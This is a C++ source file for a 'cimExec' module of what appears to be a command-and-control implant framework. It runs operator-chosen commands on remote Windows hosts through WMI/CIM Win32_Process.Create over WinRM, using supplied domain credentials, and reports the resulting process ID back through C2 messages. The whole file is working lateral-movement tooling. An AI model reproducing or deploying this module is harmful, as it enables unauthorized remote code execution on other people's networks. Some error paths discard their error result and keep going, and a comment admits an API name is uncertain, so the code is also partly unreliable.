#include "CimExec.hpp"

#include "Common.hpp"

#include <sstream>

#ifdef _WIN32
#define MI_API_VERSION 3
#include <windows.h>
#include <mi.h>
#pragma comment(lib, "mi.lib")
#endif

using namespace std;

constexpr std::string_view moduleNameCim = "cimExec";
constexpr unsigned long long moduleHashCim = djb2(moduleNameCim);

#ifdef _WIN32
extern "C" __declspec(dllexport) CimExec* CimExecConstructor()
{
    return new CimExec();
}
#else
extern "C" __attribute__((visibility("default"))) CimExec* CimExecConstructor()
{
    return new CimExec();
}
#endif

CimExec::CimExec()
#ifdef BUILD_TEAMSERVER
    : ModuleCmd(std::string(moduleNameCim), moduleHashCim)
#else
    : ModuleCmd("", moduleHashCim)
#endif
{
}

CimExec::~CimExec() = default;

std::string CimExec::getInfo()
{
    std::ostringstream oss;
#ifdef BUILD_TEAMSERVER
    oss << "CIM/MI Execution Module:\n";
    oss << "Invoke Win32_Process.Create using the native MI (CIM) API over WS-Man." << '\n';
    oss << "Options:" << '\n';
    oss << "  -h <host>            Remote host." << '\n';
    oss << "  -n <namespace>      Namespace (default root/cimv2)." << '\n';
    oss << "  -c <command>        Command to execute." << '\n';
    oss << "  -a <arguments>      Arguments for the command." << '\n';
    oss << "  -u <user>           DOMAIN\\user credentials." << '\n';
    oss << "  -p <password>       Password for the credential." << '\n';
    oss << "Example:" << '\n';
    oss << "  cimExec -h server01 -c cmd.exe -a \"/c ipconfig\"" << '\n';
#endif
    return oss.str();
}

std::string CimExec::packParameters(const Parameters& params) const
{
    std::string packed;
    auto append = [&packed](const std::string& value)
    {
        packed.append(value);
        packed.push_back('\0');
    };

    append(params.hostname);
    append(params.namespaceName);
    append(params.command);
    append(params.arguments);
    append(params.username);
    append(params.password);
    return packed;
}

CimExec::Parameters CimExec::unpackParameters(const std::string& data) const
{
    Parameters params;
    std::vector<std::string> parts;
    size_t start = 0;
    while (start < data.size())
    {
        size_t end = data.find('\0', start);
        if (end == std::string::npos)
        {
            break;
        }
        parts.emplace_back(data.substr(start, end - start));
        start = end + 1;
    }

    if (parts.size() < 6)
    {
        return params;
    }

    params.hostname = parts[0];
    params.namespaceName = parts[1];
    params.command = parts[2];
    params.arguments = parts[3];
    params.username = parts[4];
    params.password = parts[5];
    return params;
}

int CimExec::init(std::vector<std::string>& splitedCmd, C2Message& c2Message)
{
#if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS)
    std::vector<std::string> args = regroupStrings(splitedCmd);
    Parameters params;
    params.namespaceName = "root/cimv2";

    if (args.size() < 2)
    {
        c2Message.set_returnvalue(getInfo());
        return -1;
    }

    for (size_t i = 1; i < args.size(); ++i)
    {
        const std::string& current = args[i];
        if (current == "-h" && i + 1 < args.size())
        {
            params.hostname = args[++i];
        }
        else if (current == "-n" && i + 1 < args.size())
        {
            params.namespaceName = args[++i];
        }
        else if (current == "-c" && i + 1 < args.size())
        {
            params.command = args[++i];
        }
        else if (current == "-a" && i + 1 < args.size())
        {
            params.arguments = args[++i];
        }
        else if (current == "-u" && i + 1 < args.size())
        {
            params.username = args[++i];
        }
        else if (current == "-p" && i + 1 < args.size())
        {
            params.password = args[++i];
        }
        else if (!current.empty() && current[0] != '-')
        {
            if (params.hostname.empty())
            {
                params.hostname = current;
            }
            else if (params.command.empty())
            {
                params.command = current;
            }
            else if (params.arguments.empty())
            {
                params.arguments = current;
            }
        }
    }

    if (params.hostname.empty() || params.command.empty())
    {
        c2Message.set_returnvalue("Missing hostname or command.\n" + getInfo());
        return -1;
    }

    c2Message.set_instruction(splitedCmd[0]);
    c2Message.set_cmd(packParameters(params));
#endif
    return 0;
}

int CimExec::process(C2Message& c2Message, C2Message& c2RetMessage)
{
    Parameters params = unpackParameters(c2Message.cmd());
    std::string result;

#ifdef _WIN32
    result = invoke(params);
#else
    (void)params;
    result = "CIM execution is only supported on Windows.\n";
#endif

    c2RetMessage.set_instruction(c2Message.instruction());
    c2RetMessage.set_cmd(c2Message.cmd());
    c2RetMessage.set_returnvalue(result);
    return 0;
}

int CimExec::errorCodeToMsg(const C2Message& c2RetMessage, std::string& errorMsg)
{
    errorMsg = c2RetMessage.returnvalue();
    return 0;
}

#ifdef _WIN32
namespace
{
    std::wstring widen(const std::string& value)
    {
        if (value.empty())
        {
            return std::wstring();
        }

        int required = MultiByteToWideChar(CP_UTF8, 0, value.c_str(), static_cast<int>(value.size()), nullptr, 0);
        if (required <= 0)
        {
            return std::wstring();
        }

        std::wstring buffer(static_cast<size_t>(required), L'\0');
        MultiByteToWideChar(CP_UTF8, 0, value.c_str(), static_cast<int>(value.size()), buffer.data(), required);
        return buffer;
    }

    std::string narrow(const std::wstring& value)
    {
        if (value.empty())
        {
            return std::string();
        }

        int required = WideCharToMultiByte(CP_UTF8, 0, value.c_str(), static_cast<int>(value.size()), nullptr, 0, nullptr, nullptr);
        if (required <= 0)
        {
            return std::string();
        }

        std::string buffer(static_cast<size_t>(required), '\0');
        WideCharToMultiByte(CP_UTF8, 0, value.c_str(), static_cast<int>(value.size()), buffer.data(), required, nullptr, nullptr);
        return buffer;
    }

    std::string narrowMiString(const MI_Char* value)
    {
        if (value == nullptr)
        {
            return std::string();
        }
        return narrow(std::wstring(value));
    }

    struct DomainSplit
    {
        std::wstring domain;
        std::wstring user;
    };

    DomainSplit splitDomainUser(const std::string& input)
    {
        DomainSplit result;
        std::string domain;
        std::string user = input;
        const size_t pos = input.find('\\');
        if (pos != std::string::npos)
        {
            domain = input.substr(0, pos);
            user = input.substr(pos + 1);
        }

        result.domain = widen(domain);
        result.user = widen(user);
        return result;
    }

    std::string formatMiError(MI_Result result, const MI_Char* message, MI_Instance* details)
    {
        std::ostringstream oss;
        oss << "MI error 0x" << std::hex << std::uppercase << static_cast<unsigned int>(result);
        oss << std::nouppercase << std::dec;

        std::string description = narrowMiString(message);
        if (description.empty() && details != nullptr)
        {
            MI_Value value;
            MI_Type type;
            MI_Uint32 flags;
            if (MI_Instance_GetElement(details, MI_T("Message"), &value, &type, &flags, nullptr) == MI_RESULT_OK &&
                type == MI_STRING && value.string != nullptr)
            {
                description = narrowMiString(value.string);
            }
        }

        if (!description.empty())
        {
            oss << ": " << description;
        }

        oss << '\n';
        return oss.str();
    }
}

std::string CimExec::invoke(const Parameters& params) const
{
    MI_Application app = MI_APPLICATION_NULL;
    MI_Result result = MI_Application_Initialize(0, MI_T("C2CoreCimExec"), nullptr, &app);
    if (result != MI_RESULT_OK)
    {
        return formatMiError(result, nullptr, nullptr);
    }

    MI_DestinationOptions destOptions = MI_DESTINATIONOPTIONS_NULL;
    result = MI_Application_NewDestinationOptions(&app, &destOptions);
    if (result != MI_RESULT_OK) {
        MI_Application_Close(&app);
        formatMiError(result, nullptr, nullptr);
    }
    MI_DestinationOptions* destOptionsPtr = nullptr;

    std::wstring passwordWide;
    MI_UserCredentials credentials{};
    if (!params.username.empty())
    {
        DomainSplit split = splitDomainUser(params.username);
        passwordWide = widen(params.password);

        credentials.authenticationType = MI_AUTH_TYPE_DEFAULT;
        credentials.credentials.usernamePassword.domain = split.domain.empty() ? nullptr : split.domain.c_str();
        credentials.credentials.usernamePassword.username = split.user.c_str();
        credentials.credentials.usernamePassword.password = passwordWide.c_str();

        // Attach credentials to the destination options
        // (function name may vary slightly by MI SDK; use the “Add…Credentials” helper for destination)
        result = MI_DestinationOptions_AddDestinationCredentials(&destOptions, &credentials);
        if (result != MI_RESULT_OK) {
            MI_Application_Close(&app);
            formatMiError(result, nullptr, nullptr);
            return formatMiError(result, nullptr, nullptr);
        }


        destOptionsPtr = &destOptions;
    }

    std::wstring hostWide = widen(params.hostname);
    std::wstring namespaceWide = widen(params.namespaceName);

    MI_Session session = MI_SESSION_NULL;
    result = MI_Application_NewSession(&app,
                                       MI_T("WINRM"),
                                       hostWide.c_str(),
                                       destOptionsPtr,
                                       nullptr,
                                       nullptr,
                                       &session);
    if (result != MI_RESULT_OK)
    {
        MI_Application_Close(&app);
        return formatMiError(result, nullptr, nullptr);
    }

    std::wstring commandLine = widen(params.command);
    if (!params.arguments.empty())
    {
        commandLine += L" ";
        commandLine += widen(params.arguments);
    }

    MI_Instance* inParams = nullptr;
    result = MI_Application_NewInstance(&app, MI_T("Win32_Process_Create"), nullptr, &inParams);
    if (result != MI_RESULT_OK)
    {
        MI_Session_Close(&session, nullptr, nullptr);
        MI_Application_Close(&app);
        return formatMiError(result, nullptr, nullptr);
    }

    MI_Value commandValue;
    commandValue.string = (MI_Char*)commandLine.c_str();
    result = MI_Instance_AddElement(inParams, MI_T("CommandLine"), &commandValue, MI_STRING, MI_FLAG_BORROW);
    if (result != MI_RESULT_OK)
    {
        MI_Instance_Delete(inParams);
        MI_Session_Close(&session, nullptr, nullptr);
        MI_Application_Close(&app);
        return formatMiError(result, nullptr, nullptr);
    }

    MI_Operation operation = MI_OPERATION_NULL;
    MI_Session_Invoke(&session,
                      0,
                      nullptr,
                      namespaceWide.c_str(),
                      MI_T("Win32_Process"),
                      MI_T("Create"),
                      nullptr,
                      inParams,
                      nullptr,
                      &operation);

    MI_Boolean moreResults = MI_FALSE;
    MI_Result finalResult = MI_RESULT_OK;
    const MI_Char* errorMessage = nullptr;
    MI_Instance* errorDetails = nullptr;
    MI_Instance* outputInstance = nullptr;

    std::ostringstream response;
    bool haveData = false;
    MI_Result getResult;

    do
    {
        getResult = MI_Operation_GetInstance(&operation,
                                              (const MI_Instance**)&outputInstance,
                                             &moreResults,
                                             &finalResult,
                                            (const MI_Char**)&errorMessage,
                                             (const MI_Instance**)&errorDetails);
        if (getResult != MI_RESULT_OK)
        {
            response.str(std::string());
            response.clear();
            response << formatMiError(getResult, errorMessage, errorDetails);
            if (errorDetails != nullptr)
            {
                MI_Instance_Delete(errorDetails);
            }
            break;
        }

        if (outputInstance != nullptr)
        {
            MI_Value value;
            MI_Type type;
            MI_Uint32 flags;

            if (MI_Instance_GetElement(outputInstance, MI_T("ReturnValue"), &value, &type, &flags, nullptr) == MI_RESULT_OK &&
                type == MI_UINT32)
            {
                response << "ReturnValue: " << value.uint32 << '\n';
                haveData = true;
            }

            if (MI_Instance_GetElement(outputInstance, MI_T("ProcessId"), &value, &type, &flags, nullptr) == MI_RESULT_OK &&
                type == MI_UINT32)
            {
                response << "ProcessId: " << value.uint32 << '\n';
                haveData = true;
            }

            MI_Instance_Delete(outputInstance);
            outputInstance = nullptr;
        }

        if (errorDetails != nullptr)
        {
            MI_Instance_Delete(errorDetails);
            errorDetails = nullptr;
        }
    }
    while (moreResults == MI_TRUE);

    if (finalResult != MI_RESULT_OK && getResult == MI_RESULT_OK)
    {
        response << formatMiError(finalResult, errorMessage, errorDetails);
        if (errorDetails != nullptr)
        {
            MI_Instance_Delete(errorDetails);
        }
    }

    if (!haveData && response.str().empty())
    {
        response << "Command executed with no output.\n";
    }

    MI_Operation_Close(&operation);
    MI_Instance_Delete(inParams);
    MI_Session_Close(&session, nullptr, nullptr);
    MI_Application_Close(&app);

    return response.str();
}
#endif
